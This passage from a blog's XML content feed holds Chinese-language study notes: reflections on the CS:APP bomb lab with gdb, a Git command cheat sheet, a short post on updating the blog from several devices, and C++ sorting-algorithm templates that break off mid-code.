type="1"><li><p>当涉及复杂递归时，可以转换为C语言后优化代码，再通过枚举的方式求出符合条件的解（第四题）。</p></li><li><p>当分支过多时，可以先将汇编代码分段，尝试一个简单的解，借助gdb，跑一下流程，枚举两三次特殊情况，渐渐就有了基本的思路（第六题）。且最好记忆各个参数的含义和上次更新的值，否则要不断回溯，时间较久。</p></li><li><p>借助gdb可以节省分析一些没必要分析的函数的时间，类似于状态机的思想，只要知道返回后的寄存器状态，就大概函数的作用（很多负责输入输出的函数）。</p></li><li><p>一般寄存器的值可能代表地址也可能代表值。另外，机器是64位小端序，注意可能有效位需要借助与mask做与操作取得，可能没有意义（第五题）。</p></li><li><p>借助文档和教材了解x86指令集。注意由于bomb实验的普及性，很多由两条指令集组成的跳转指令大概率可以直接搜到，而实际状况往往需要自己分析各个寄存器的状态。当分支足够多的时候，若每个分支都要用3的思想，则需要2*分支数的时间，较为低效。</p></li><li><p>借助gdb显示格式，如字符串、char、16bit字符串，能够更快明白数据/地址的意义；tui模式更方便debug；多开终端，gdb与源码同时分析；直接打出大段地址，便于分析。</p></li><li><p>一开始分不清地址还是数据，返回值和参数，不断对一些不相关的readline函数或标准库函数进行分析耗时较长。后面逐渐驾轻就熟，花费的时间则合理了不少。</p></li><li><p>实验涉及的数值变换较少，一般都只涉及8bit以内的正数，实际大大简化了问题，把rdi、edi甚至di都可以看做是一个数，也更容易理解（虽然汇编代码都使用了很多考虑到有符号数，符号拓展的方式等的函数，实际由于实验的数据较弱，不需要考虑边界情况）。通过gdb不断追踪值也可以确认这种判断。</p></li><li><p>每隔一段时间容易混淆16进制表示和10进制表示，尤其在计算地址距离时。</p></li><li><p>汇编指令容易混淆mov对应的地址与值，a, b -&gt; <em>b =</em>a，寄存器同理。区分立即数，reg直接，reg间接的写法。mov reg_1, reg_2-&gt; <em>reg_1 = </em>reg_2； mov reg_1, (reg_2) *reg_1 = **reg_2,即把reg_1的值存到<em>reg_2上。容易把reg的值当成了地址。一般省略</em>，直接写成reg_1= reg_2即可。而lea只做值的运算，mv采用取地址，两者也容易混淆。</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>CS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git基础</title>
    <link href="/2023/02/07/Git/"/>
    <url>/2023/02/07/Git/</url>
    
    <content type="html"><![CDATA[<h1 id="start">Start</h1><h2 id="基本结构">基本结构</h2><p>WorkingDirectory当前使用的branch，与Repo区分，更新比对操作都要指定Repo中的一个Branch进行。</p><p><img src="/images/git.png" alt="图来源于网络,侵删" style="zoom: 50%;"  /></p><p>其中Repo中保存了多个branch的版本信息，可以任意切换到WorkingDirectory.</p><p><img src="/images/branch.png" alt="图来源于网络,侵删"  style="zoom: 50%;" /></p><p><ahref="https://medium.com/@saicharanadurthi/demystifying-git-stash-basic-workflow-in-the-four-areas-f2192b5e509c">imagesource</a> 可以借助stash暂存一部分内容</p><p><img src="/images/git_work_flow.png" style="zoom: 67%;" /></p><h2 id="注意事项">注意事项</h2><p>注意每次使用前先同步，否则可能出现冲突。</p><h2 id="基本命令">基本命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># set .gitconfig [user]</span><br><span class="hljs-comment"># 查看状态</span><br>git status<br><span class="hljs-comment"># 查看提交的commit</span><br>git <span class="hljs-built_in">log</span>  <br>git <span class="hljs-built_in">log</span> --pretty=oneline<br><br><span class="hljs-comment"># 设置代理 也可以直接设置环境变量</span><br>git config --global http.proxy http://proxyUsername:proxyPassword@proxy.server.com:port<br>git config --global --get-regexp http.*<br>git config --global --<span class="hljs-built_in">unset</span> http.proxy<br>git config --global --<span class="hljs-built_in">unset</span> http.https://domain.com.proxy<br></code></pre></td></tr></table></figure><h1 id="初始化">初始化</h1><p>标志在于.git文件的生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 复制他人的网址 https://...</span><br>git <span class="hljs-built_in">clone</span>  <br><span class="hljs-comment"># 在自己的文件夹下生成 默认的主干main</span><br>git init   <br><span class="hljs-comment"># 选择自己的主干的名字</span><br>git init -b defualt_branch <br></code></pre></td></tr></table></figure><h1 id="缓存区管理">缓存区管理</h1><h2 id="提交修改">提交修改</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cur -&gt; stage </span><br>git add . <br><span class="hljs-comment"># stage -&gt; repo</span><br>git commit -m <span class="hljs-string">&quot;log&quot;</span>  <br></code></pre></td></tr></table></figure><h2 id="撤销修改">撤销修改</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 默认从HEAD去更新</span><br><span class="hljs-comment"># 撤销unstaged 还未add</span><br>git restore [file]<br><span class="hljs-comment"># 撤销stage中的改变 已经add</span><br>git reset [file]<br>git checkout -- test.txt<br></code></pre></td></tr></table></figure><h1 id="分支管理">分支管理</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建branch</span><br>git checkout -b [name]<br><span class="hljs-comment"># 删除</span><br>git branch -d<br><span class="hljs-comment"># 合并分支</span><br>git merge  <br></code></pre></td></tr></table></figure><h1 id="版本管理">版本管理</h1><h2 id="比较文件">比较文件</h2><p>可以设置--diff-algorithm选择不同的比较方式，一般修改的代码都易于查重。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># git log 查看后用commit_id比较也可以</span><br><br><span class="hljs-comment"># 语法问题 git diff master bug/pr-1 == git diff master..bug/pr-1</span><br><span class="hljs-comment"># 工作区 (current directory) 与 版本库(HEAD of branch)中最新文件的比较 HEAD</span><br>git diff HEAD [file]<br><span class="hljs-comment"># 查看暂存区与版本库(HEAD) </span><br>git diff --staged [file]<br><span class="hljs-comment"># 当前分支(HEAD of branch) 与上一个版本的变化 (@ is an alias for HEAD) (~3 = ^^^ = 回退三个版本)</span><br>git diff HEAD^ HEAD<br><span class="hljs-comment"># 与远程库比较 origin一般指代远程库 /main 代表分支</span><br>check diff HEAD..origin/main<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 也可以理解成&quot;-&quot;只来自与第一个文件，&quot;+&quot;只来自于第二个文件</span><br><span class="hljs-string">&#x27;+&#x27;</span> -- A line was added here to the first file.<br><span class="hljs-string">&#x27;-&#x27;</span> -- A line was removed here from the first file.<br><br><span class="hljs-comment">// 例子</span><br><span class="hljs-comment">// 第1个文件展示了8行(10-2)，从第1行开始，第2文件展示了9行(10-1)，从第1行开始</span><br><br>@@ <span class="hljs-number">-1</span>,<span class="hljs-number">8</span> +<span class="hljs-number">1</span>,<span class="hljs-number">9</span> @@ <br><span class="hljs-number">1</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cache.h&quot;</span></span><br><span class="hljs-number">2</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;walker.h&quot;</span></span><br><span class="hljs-number">3</span><br><span class="hljs-number">4</span> -<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">cmd_http_fetch</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *prefix)</span></span><br><span class="hljs-function">5 +<span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv)</span></span><br><span class="hljs-function">6  </span>&#123;<br><span class="hljs-number">7</span> +       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *prefix;<br><span class="hljs-number">8</span>         <span class="hljs-keyword">struct</span> <span class="hljs-title class_">walker</span> *walker;<br><span class="hljs-number">9</span>         <span class="hljs-type">int</span> commits_on_stdin = <span class="hljs-number">0</span>;<br><span class="hljs-number">10</span>        <span class="hljs-type">int</span> commits;<br></code></pre></td></tr></table></figure><h2 id="标签">标签</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># tag/snapshot 指向一个commit(release)</span><br><br>git tag v1.0<br>git tag v0.9 f52c633<br>git show v0.9<br>git tag -d v0.1<br><br>git push origin --tags<br>git tag -d v0.9<br></code></pre></td></tr></table></figure><h1 id="远程管理">远程管理</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 先在网页端初始化一个库</span><br><span class="hljs-comment"># 也可以下载gh</span><br>gh auth login  <br>git remtedeote add origin https://github.com/USER/REPO.git<br><span class="hljs-comment"># 查看情况</span><br>git remote -v<br>git remote <span class="hljs-built_in">rm</span> origin<br><span class="hljs-comment"># 借助PAT token (Personal Access Token)连接已有的库 </span><br><span class="hljs-comment"># git clone = git fetch + git checkout</span><br>git <span class="hljs-built_in">clone</span> https://pat@github.com/&lt;account&gt;/&lt;repo&gt;.git<br><span class="hljs-comment"># 上传与更新</span><br>git pull branch origin(br)<br>git push branch origin<br><br><span class="hljs-comment"># 下载特定的版本 下载完checkout</span><br><br></code></pre></td></tr></table></figure><p>创建branch而非直接合并 refs/remotes/remote-repo，fetch和clone</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git remote add coworkers_repo git@bitbucket.org:coworker/coworkers_repo.git<br>git fetch coworkers_repo coworkers/feature_branch<br>fetching coworkers/feature_branch<br>git checkout coworkers/feature_branch<br></code></pre></td></tr></table></figure><h1 id="文件设置">文件设置</h1><p>.gitignore 不同步的后缀</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># Windows:</span><br>Thumbs.db<br>ehthumbs.db<br>Desktop.ini<br><br><span class="hljs-comment"># Python:</span><br>*<span class="hljs-string">.py</span>[cod]<br>*<span class="hljs-string">.so</span><br>*<span class="hljs-string">.egg</span><br>*<span class="hljs-string">.egg-info</span><br>dist<br>build<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>多设备更新博客</title>
    <link href="/2023/02/07/hexo+/"/>
    <url>/2023/02/07/hexo+/</url>
    
    <content type="html"><![CDATA[<h1 id="原由">原由</h1><p>当PC电脑不在身边的时候，可以借助平板更新博客。且迁移环境的时候也需要以下的流程。</p><h1 id="前置知识">前置知识</h1><p><a href="../../../../2023/02/07/Git">Git基础</a> <ahref="../../../../2021/10/07/hexo">hexo配置</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法基本模板</title>
    <link href="/2022/07/04/template/"/>
    <url>/2022/07/04/template/</url>
    
    <content type="html"><![CDATA[<h1 id="模板">模板</h1><h2 id="位置关系">位置关系</h2><h3 id="相对位置">相对位置</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">vi <span class="hljs-title">id</span><span class="hljs-params">(n)</span>, <span class="hljs-title">rid</span><span class="hljs-params">(n)</span></span>;<br><br><span class="hljs-comment">// 当前数组的id对应的变换数组的id</span><br><span class="hljs-comment">// id[x] = T_x;</span><br><span class="hljs-comment">// id[x]返回当前id对应的原id 1. 可用于改变原数列的值 2. 访问原序列的值 </span><br><span class="hljs-built_in">rep</span> (i, <span class="hljs-number">0</span>, n) id[i] = i;<br><br><span class="hljs-comment">// 变换数组当前的id对应的原数组的id</span><br><span class="hljs-comment">// rid[id[x]] = x (rid[T_x] = x) </span><br><span class="hljs-comment">// 通常直接使用原数组 + id 表示 Tarr 所以通常不需要</span><br><br><span class="hljs-comment">// 记录T变换后id的映射 后 - 前</span><br><span class="hljs-built_in">rotate</span>(id.<span class="hljs-built_in">begin</span>(), id.<span class="hljs-built_in">begin</span>() + x, id.<span class="hljs-built_in">end</span>());<br><span class="hljs-comment">// sort </span><br><span class="hljs-built_in">sort</span>(<span class="hljs-built_in">all</span>(id), [](<span class="hljs-keyword">auto</span> &amp;a, <span class="hljs-keyword">auto</span> &amp;b) &#123;<br>    <span class="hljs-keyword">return</span> g[a] &lt; g[b];<br>&#125;);<br><span class="hljs-comment">// 0 -&gt; pos + i</span><br><span class="hljs-built_in">rep</span> (i, <span class="hljs-number">0</span>, n) &#123;<br>id[i] = (pos + i) % <span class="hljs-number">3</span>;    <br>&#125;<br><br><span class="hljs-comment">// 按原id输出</span><br>vv[id[<span class="hljs-number">0</span>]] = v[id[<span class="hljs-number">0</span>]];<br>vv[id[<span class="hljs-number">2</span>]] = v[id[<span class="hljs-number">2</span>]] + v[id[<span class="hljs-number">0</span>]];<br>vv[id[<span class="hljs-number">1</span>]] = <span class="hljs-built_in">accumulate</span>(<span class="hljs-built_in">all</span>(v), <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h3 id="排列">排列</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 若只能交换一次</span><br><span class="hljs-comment">// 1 2 2 3 4 5 6</span><br><span class="hljs-comment">// 直接比较原来的排列</span><br><span class="hljs-comment">// 1 3 2 2 4 5 6</span><br><span class="hljs-comment">// 一定代表着不同的部分</span><br></code></pre></td></tr></table></figure><h3 id="判断个数距离">判断个数/距离</h3><p>转换区间: (i, n) 的个数 -&gt; [i + 1, n - 1] == b - a + 1</p><p>转换坐标 逆序坐标 x -&gt; 正序坐标 n - x + 1</p><p>while if (match) j++ : (i, j)</p><p>注意 for(;;j++) x for(;;)</p><h2 id="sort">Sort</h2><p>topk 问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// c++ greater means different sort 从大到小， priority 小顶堆</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">btmp</span>&#123;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">const</span> pis &amp;a, <span class="hljs-type">const</span> pis &amp;b)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(a.first &lt; b.first) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a.first &gt; b.first) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span>(a.second &gt; b.second) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="quicksort">quicksort</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">partition</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[], <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> pivot = arr[high];<br><span class="hljs-type">int</span> i = (low - <span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = low; j &lt;= high - <span class="hljs-number">1</span>; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (arr[j] &lt;= pivot) &#123;<br>i++;<br><span class="hljs-built_in">swap</span>(arr[i], arr[j]);<br>&#125;<br>&#125;<br>    <span class="hljs-comment">// 替换到交界的位置 </span><br><span class="hljs-built_in">swap</span>(arr[i + <span class="hljs-number">1</span>], arr[high]);<br><span class="hljs-keyword">return</span> (i + <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">partition_r</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[], <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>));<br><span class="hljs-type">int</span> random = low + <span class="hljs-built_in">rand</span>() % (high - low);<br>    <span class="hljs-comment">// 与最高位交换即可</span><br><span class="hljs-built_in">swap</span>(arr[random], arr[high]);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">partition</span>(arr, low, high);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">quickSort</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[], <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 拆分问题</span><br><span class="hljs-keyword">if</span> (low &lt; high) &#123;<br><span class="hljs-comment">// 排序</span><br>        <span class="hljs-type">int</span> pi = <span class="hljs-built_in">partition_r</span>(arr, low, high);<br><span class="hljs-built_in">quickSort</span>(arr, low, pi - <span class="hljs-number">1</span>);<br><span class="hljs-built_in">quickSort</span>(arr, pi + <span class="hljs-number">1</span>, high);<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="midsort">midsort</h3><p>逆序对问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 归并 </span><br><span class="hljs-comment">// low + (high - low + 1) / 2</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">mergeSort</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[], <span class="hljs-type">int</span> L, <span class="hljs-type">int</span> R)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (L == R)&#123;<br><span class="hljs-keyword">return</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">int</span> M = (L + R) / <span class="hljs-number">2</span>;<br><span class="hljs-built_in">mergeSort</span>(arr, L, M);<br><span class="hljs-built_in">mergeSort</span>(arr, M + <span class="hljs-number">1</span>, R);<br><span class="hljs-built_in">merge</span>(arr, L, M + <span class="hljs-number">1</span>, R);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// create left arr </span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> l = mid - left + <span class="hljs-number">1</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> r = right - mid;<br><span class="hljs-comment">// Create temp arrays</span><br><span class="hljs-type">int</span> *left = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[l],<br>*right = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[r];<br><span class="hljs-comment">// combine arrs</span><br><span class="hljs-type">int</span> ll = <span class="hljs-number">0</span>, rr = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (ll &lt; l &amp;&amp; rr &lt; r);<br><span class="hljs-comment">// 防止遗漏</span><br><span class="hljs-keyword">while</span> (ll &lt; l) <span class="hljs-keyword">while</span>(rr &lt; r);<br></code></pre></td></tr></table></figure><h3 id="heapsort">heapsort</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">(<span class="hljs-type">int</span> size, <span class="hljs-type">int</span> i)</span></span>&#123;<br><span class="hljs-comment">// 最后一个非叶子节点的位置 2x -&gt; 左节点 2x+1 -&gt; 右节点</span><br><span class="hljs-type">int</span> l = <span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>; <br>    <span class="hljs-type">int</span> r = <span class="hljs-number">2</span> * i + <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> largest = i;<br>    <span class="hljs-keyword">if</span> (l &lt; size &amp;&amp; hT[l] &gt; hT[largest])<br>largest = l;<br><span class="hljs-keyword">if</span> (r &lt; size &amp;&amp; hT[r] &gt; hT[largest])<br>largest = r;<br><span class="hljs-keyword">if</span> (largest != i) &#123;<br>        <span class="hljs-comment">// 自顶而下调整</span><br>        <span class="hljs-built_in">swap</span>(&amp;hT[i], &amp;hT[largest]);<br><span class="hljs-built_in">heapify</span>(size, largest);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// heap sort 堆顶替换，重建堆</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heapSort</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 建堆（从最后一个非叶子节点向上）</span><br>    <span class="hljs-comment">// size 2n + 2 / 2n + 3</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = size / <span class="hljs-number">2</span> - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-built_in">heapify</span>(size, i);<br>    &#125;<br>    <span class="hljs-comment">// 堆排序</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = size - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>        <span class="hljs-comment">// 将当前最大的放置到数组末尾</span><br>        <span class="hljs-built_in">swap</span>(arr[<span class="hljs-number">0</span>], arr[i]);<br>        <span class="hljs-comment">// 将未完成排序的部分继续进行堆排序</span><br>        <span class="hljs-built_in">heapify</span>(i, <span class="hljs-number">0</span>);             <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="插入排序">插入排序</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 部分sort</span><br><span class="hljs-comment">// 注意n - 1次</span><br></code></pre></td></tr></table></figure><h3 id="基数排序">基数排序</h3><p>radix sort</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 先解决子问题 个位数的排序问题</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">countSort</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[], <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> exp)</span> </span>&#123;<br>    <span class="hljs-type">int</span> output[n]; <br>    <span class="hljs-type">int</span> i, count[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br> <br>    <span class="hljs-comment">// 基于每个位数的分布</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        count[(arr[i] / exp) % <span class="hljs-number">10</span>]++;<br> <br>    <span class="hljs-comment">// 真实的位置映射</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>        count[i] += count[i - <span class="hljs-number">1</span>];<br><br>    <span class="hljs-comment">// 按顺序赋值</span><br>    <span class="hljs-keyword">for</span> (i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        output[count[(arr[i] / exp) % <span class="hljs-number">10</span>] - <span class="hljs-number">1</span>] = arr[i];<br>        count[(arr[i] / exp) % <span class="hljs-number">10</span>]--;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        arr[i] = output[i];<br>&#125;<br><br><span class="hljs-comment">// Radix Sort</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">radixsort</span><span 